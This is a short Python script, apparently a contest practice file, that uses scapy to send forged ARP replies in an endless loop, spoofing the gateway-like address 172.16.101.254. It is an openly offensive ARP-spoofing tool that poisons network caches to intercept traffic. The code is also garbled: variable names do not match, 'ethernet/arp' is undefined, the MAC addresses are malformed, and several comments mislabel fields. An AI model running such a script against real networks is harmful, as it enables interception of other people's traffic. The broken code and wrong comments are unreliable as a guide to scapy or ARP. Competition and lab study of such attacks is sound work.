# -*- codeing = utf-8 -*-
# 时间:2021/11/29 19:31
# 作者:CK
# 文件名:18国赛-第一阶段.py
# 开发环境:PyCharm
from scapy.all import *#导入scapy模块，并应用所有的功能
import time#导入time模块

soofp=ethernet/arp#将以太网和arp两层协议的组合放进soofp中
spoofp[Ether].dst='00:oc:29:d6:96:9c'#以太网的目的地址
spoofp[Ether].src='00:oD:29:d6:96:9c:1c'#以太网的相对路径
spoofp[Ether].type=0x0806#源以太网协议的类型
spoofp[ARP].hwtype=0x1#以太网协议的硬件类型
spoofp[ARP].ptype=0x800#目标以太网协议的类型
spoofp[ARP].plen=4#arp协议地址长度
spoofp[ARP].op=2#arp的类型
spoofp[ARP].hwsrc='00:0D:29:d6:96:1c'#arp的源mac地址
spoofp[ARP].psrc='172.16.101.254'#arp的源ip地址
spoofp[ARP].hwdst='00:00:00:00:00:00'#目标mac地址
spoofp[ARP].pdst='172.16.101.254'#arp的IP地址

while True:#无限循环
    sendp(spoofp)#用scapy里的sendp函数发送这个数据包
    print('Sending ARP Spoof To Physical Machine')#打印